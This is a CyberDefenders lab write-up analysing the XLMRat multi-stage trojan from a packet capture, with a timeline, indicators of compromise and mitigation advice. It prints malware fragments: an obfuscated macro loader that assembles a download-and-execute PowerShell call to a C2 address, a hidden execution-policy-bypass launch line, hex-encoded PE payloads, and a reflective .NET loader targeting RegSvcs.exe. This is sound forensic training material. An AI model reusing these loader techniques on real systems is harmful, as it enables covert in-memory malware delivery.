# CyberDefenders Lab Write-Up: XLMRat

**Source:** https://cyberdefenders.org/blueteam-ctf-challenges/achievements/JaySOC/xlmrat/

A compromised machine was flagged with the SOC team due to suspicious network traffic. The task was to analyse the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.

The task was to investigate the provided PCAP, determine the attack vector, identify any malware artifacts that were transmitted, construct a timeline of compromise, and conduct hashing of any artifacts for further analysis.

---

## Findings

Utilising packet diagnosis tools, malware databases and hashing tools, I was able to establish that the malware was a multi-stage Remote Access Trojan deployment, common in commodity malware, utilising XLM macros as the initial loader (`xlm.txt`) and a PowerShell script obfuscated in a JPEG file (`mdm.jpg`) which contained a .NET in-RAM loader and a binary payload launched through a .NET reflection, all controlled by an orchestrator script blob.

Reviewing the orchestrator, I found that together these malware artifacts would achieve a "living off the land" execution, with minimal footprint on the disk.

**Tools used:** Wireshark, CyberChef, VirusTotal, NotePad, Azure Cloud, PowerShell

---

## Incident Timeline

| Time (AEST) | Event |
|-------------|-------|
| 10 January 2024 03:27:27 | Compromised machine commences a TCP Three-way handshake with `45.126.209.5` from port `49708` to port `222` |
| 10 January 2024 03:27:27 | GET file request for `xlm.txt` sent from the compromised machine to `45.126.209.4` |
| 10 January 2024 03:27:29 | GET file request for `mdm.jpg` sent from the compromised machine to `45.126.209.4` |
| 10 January 2024 03:27:29 | Compromised machine isolated |
| 20 June 2025 12:30:00 | PCAP file received from SOC Team |

---

## Technical Analysis

Whilst the PCAP does not indicate the initial infection vector, it is likely that the machine was compromised via an out-of-band method (phishing email with hidden XLM Macros or an employee opening an infected document), triggering the HTTP requests.

Utilising Wireshark, I opened the provided packet capture file and scanned through the various frames using the `http.request` filter.

Through this filter I was able to isolate two frames indicating files were downloaded by the compromised machine from the C2 server: `mdm.jpg` and `xlm.txt`.

Viewing the HTTP streams on both files, I was able to isolate and export the transmitted files, siloing them in a folder for further analysis. Opening both files using NotePad, I reviewed the HTTP Streams of both files for more information.

---

## Loader Analysis (xlm.txt)

The `xlm.txt` contained fragmented strings typical of XLM macro loaders, reassembled to execute hidden PowerShell:

```vba
Dim LZeWX(8B), OodjR, i

' Define each part based on the provided order
LZeWX(0)  = "[B"
LZeWX(1)  = "YT"
LZeWX(2)  = "e["
LZeWX(3)  = "]]"
LZeWX(4)  = ";$"
LZeWX(5)  = "AI"
LZeWX(6)  = "23"
LZeWX(7)  = "='"
LZeWX(8)  = "Ie"
LZeWX(9)  = "X("
LZeWX(10) = "Ne"
LZeWX(11) = "W-"
LZeWX(12) = "OB"
LZeWX(13) = "Je"
LZeWX(14) = "CT"
LZeWX(15) = " N"
LZeWX(16) = "eT"
LZeWX(17) = ".W"
LZeWX(18) = "';"
LZeWX(19) = "$B"
LZeWX(20) = "45"
LZeWX(21) = "6="
LZeWX(22) = "'e"
LZeWX(23) = "BC"
LZeWX(24) = "LI"
LZeWX(25) = "eN"
LZeWX(26) = "T)"
LZeWX(27) = ".D"
LZeWX(28) = "OW"
LZeWX(29) = "NL"
LZeWX(30) = "O'"
LZeWX(31) = ";["
LZeWX(32) = "BY"
LZeWX(33) = "Te"
LZeWX(34) = "[]"
LZeWX(35) = "];"
LZeWX(36) = "$C"
LZeWX(37) = "78"
LZeWX(38) = "9="
LZeWX(39) = "'V"
LZeWX(40) = "AN"
LZeWX(41) = "(''"
LZeWX(42) = "'h"
LZeWX(43) = "tt"
LZeWX(44) = "p:"
LZeWX(45) = "//"
LZeWX(46) = "45"
LZeWX(47) = ".1"
LZeWX(48) = "26"
LZeWX(49) = ".2"
LZeWX(50) = "09"
LZeWX(51) = ".4"
```

At the bottom of the fragmented strings, an execution line was identified which reconstructs and executes a PowerShell command silently — further evidence supporting `xlm.txt` as the malware loader:

```
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
```

---

## mdm.jpg Contents

A further review of the `mdm.jpg` file indicated that its HTTP stream consisted largely of hex string sequences, `MZ` in ASCII, which were indicative of a Windows executable obfuscated by numerous `_` values in between the hex values.

### Payload 1 — hexString_bbb

Based on the underscore-delimited string of hex values following the variable assignment, this segment appeared to be a compiled binary blob:

```
$hexString_bbb = "4D_5A_90_00_03_00_00_00_04_00_00_00_FF_FF_00_00_88_00_00_00_00_00_00_00_40_00_00_00_00_00_00_00
0_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_8F_1F_B4_0E_00_B4_09_CD_21_B8_01_4C_CD_21_54...
```

### Payload 2 — hexString_pe

A review of `hexString_pe` found that much like `hexString_bbb`, it is also an underscore-delimited string of hexadecimal byte values.

### Payload 3 — Nkbb

Within the script, `hexString_bbb` is converted into a byte array named `Nkbb`, representing the actual malware payload, which is then passed as an argument into an in-memory method invoked via a native .NET loader, allowing it to be executed without a compiled executable to disk:

```powershell
Sleep 5
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe   = $hexString_pe  -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
```

---

## Payload Orchestrator

The orchestrator directs the movements of the individual payloads. Within the orchestrator, a number of functions essential to launching the malware were identified.

After a 5 second pause — likely to evade detection within a sandbox environment — the orchestrator decodes the hex blobs from both strings into the compromised machine's RAM as bytes:

```powershell
Sleep 5
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe   = $hexString_pe  -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5
$HM = 'L###############o#################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)

$NK = $Fu.GetType('N#ew#PE#2.P#E' -replace '#', '')
$MZ = $NK.GetMethod('Execute')
$NA = 'C:\W#######indow#############s\Mi####cr' -replace '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe' -replace '#', ''
$VA = @($AC, $NKbb)
```

The key execution line `[Reflection.Assembly]::Load($pe)` loads `hexString_pe` directly into memory as a .NET assembly. Finally, an execute method triggers the payload in machine RAM.

---

## Network Indicators

Inspecting the GET request, the first malware stage was confirmed as installed from:

```
http://45.126.209.4:222/mdm.jpg
```

Utilising the WhoIS domain tool, the IP address from which the malware was initially downloaded is hosted by `reliablesite.net`. The registered network allocation address is listed as 2115 NW 22nd St, Miami FL 33142. This does not necessarily indicate the physical address of the server — more likely it is where the ownership of the IP block is registered for administrative and billing purposes.

**WhoIS Quick Stats:**

| Field | Value |
|-------|-------|
| IP Location | Singapore — Reliablesite.net LLC |
| ASN | AS23470 RELIABLESITE, US (registered Aug 10, 2018) |
| Resolve Host | vm.45.126.209.4.ardentishost.store |
| Whois Server | whois.apnic.net |
| IP Address | 45.126.209.4 |

---

## Indicators of Compromise

**IP Address:** `45.126.209.4:222`

**Artifacts:**

| File | Size | SHA256 |
|------|------|--------|
| `mdm.jpg` | 422 KB | `df8a7089a3b2b1b0686b1d216dc11dcb93627182039414bd4c6ea9cc3e079aac` |
| `xlm.txt` | 3 KB | `634465c0d45f54f69eac8515e5a52b664e85a06163e8e876e9295a3581100354` |
| `Nkbb.tmp` | 65 KB | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` |

**File Paths:**
- `C:\Users\Public\Conted.vbs`
- `C:\Users\Public\Conted.ps1`
- `C:\Users\Public\Conted.bat`

---

## Tools and Methodology

- **Wireshark** — PCAP analysis
- **CyberChef** — Hex decoding and hashing
- **VirusTotal** — Hash cross-reference
- **Microsoft Azure** — Virtual machine build and sandboxing
- **WHOIS** — IP investigation

Within a sandbox environment set up through Microsoft Azure, Wireshark was installed and the PCAP file uploaded. Using the export function in Wireshark, both the JPEG and TXT files were exported to a quarantined folder and opened in a text viewer.

The different hex strings (`hexString_bbb` and `hexString_pe`) were located and highlighted. At the bottom of the script in `mdm.jpg` was a PowerShell orchestrator that converted both hex strings into a byte array, loaded `hexString_pe` into local memory as a .NET assembly and executed `hexString_bbb`.

The binaries in both hex strings were reconstructed by running:

```powershell
$nkbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
Set-Content -Path bbb.tmp -Value $bbb -Encoding Byte -NoNewline

$pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
Set-Content -Path pe.tmp -Value $pe -Encoding Byte -NoNewline
```

Evidence of an orchestrator was also located in the PowerShell script, which loads `hexString_pe` in-memory and uses both `GetType('NewPE2.PE')` and `GetMethod('Execute')` to launch the payload, passing `hexString_bbb` (the actual RAT shell) as an argument.

Using CyberChef, the resulting `.tmp` files were hashed through SHA256 and threat checks conducted with VirusTotal.

---

## Malware in Action

### 1. Loader (xlm.txt / XLM macro)
- Reassembles an obfuscated PowerShell command from fragmented strings
- Launches PowerShell with hidden window (`-WIND HIDDEN`), bypasses execution policy (`-Exec Bypass`)

### 2. Payload Delivery (mdm.jpg)
- Actually a PowerShell script containing two large hex strings:
  - `$hexString_pe` → .NET loader, invoked via `[Reflection.Assembly]::Load` directly into memory
  - `$hexString_bbb` → binary payload passed to the loader's Execute method
- Executes the malicious binary fully in memory

### 3. Persistence
- Script writes out:
  - A PowerShell script (`Conted.ps1`)
  - A batch file (`Conted.bat`)
  - A VBScript (`Conted.vbs`)
- Uses Windows Task Scheduler to trigger every 2 minutes

---

## Summary

| Attribute | Detail |
|-----------|--------|
| Type | Multi-stage Trojan deployment using PowerShell and .NET reflection |
| Execution | Runs from memory to avoid dropping direct executables |
| Techniques | Uses LOLBins (PowerShell, `regsvcs.exe`) |
| Persistence | Establishes persistence via scheduled tasks |

---

## Lessons Learned and Future Mitigation

### Disable XLM Macros

The infection chain started in `xlm.txt`, utilising XLM macro code. These macros reconstructed an obfuscated PowerShell command from fragmented hex strings, then launched with:

```
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
```

XLM Macros are a legacy Excel feature that bypasses many current Office macro-scanning heuristics, but is still supported for compatibility. This vulnerability was leveraged as the initial script to enable the rest of the malware — without which the subsequent downloads would not have occurred.

**Recommendation:** Disable XLM macros via GPO or Office administrative templates to break infection chains in the early stages.

---

### Content Validation is Critical

The second stage of the malware was downloaded as `mdm.jpg`, which at face value presented as a JPEG image file, but opening it in a text viewer showed that it was actually a PowerShell script containing hex blobs (`hexString_pe` and `hexString_bbb`). The reason this file was able to evade detection by native security and antivirus was because these tools only conduct shallow checks based on file extensions.

**Recommendation:** Reconfigure security gateways and endpoint antivirus to conduct file content and magic byte inspection beyond just file extensions.

---

### Outbound Traffic Over Unexpected Ports Must Be Blocked or Scrutinised

The compromised machine sent GET requests via port `222` to the C2 server (`45.126.209.4`). This use of uncommon ports is standard practice in malware to avoid basic perimeter monitoring — in this case, these requests were pivotal in allowing the malware to retrieve its tools.

**Recommendation:** Implement firewall policies to block or create alerts on HTTP(S) over unexpected ports, including the use of DPI/egress filtering to detect HTTP activity on unusual ports.

---

### Payload Reconstruction is Critical, Even in Fileless Attacks

The orchestrator script contained a large volume of hex strings obfuscated through underscore separation. Manually converting these obfuscated hex strings into binaries allowed for in-depth analysis to understand how the payload worked, even in the scenario where it had not been detected and the compromised machine had not been isolated.

**Recommendation:** SOC teams should be trained and equipped with tools (CyberChef, custom scripts) to reconstruct and analyse obfuscated payloads as a standard forensic practice.
